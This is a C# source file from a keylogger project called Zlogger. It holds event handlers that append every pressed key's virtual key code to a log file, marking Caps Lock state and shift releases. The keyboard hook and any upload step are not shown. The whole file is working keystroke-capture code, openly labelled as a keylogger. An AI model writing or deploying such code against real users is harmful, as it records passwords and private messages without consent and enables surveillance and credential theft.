using Rodjenihm.Zlogger.Core;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Rodjenihm.Zlogger
{
    public static class KeyloggerEventHandler
    {
        public static void HandleKeyDown(object sender, Core.KeyEventArgs e)
        {
            var keylogger = sender as Keylogger;

            using (var sw = new StreamWriter(keylogger.LogPath, true))
            {
                var key = e.VkCode;
                if (key == 20)
                {
                    if (!e.IsCapsLocked)
                    {
                        sw.Write($"{key},");
                    }
                    else
                    {
                        sw.Write($"/{key},");
                    }
                    return;
                }

                sw.Write($"{key},");
            }
        }

        public static void HandleKeyUp(object sender, Core.KeyEventArgs e)
        {
            var keylogger = sender as Keylogger;

            using (var sw = new StreamWriter(keylogger.LogPath, true))
            {
                var key = e.VkCode;
                if (key == 160 || key == 161)
                {
                    sw.Write($"/{key},");
                }
            }
        }
    }
}
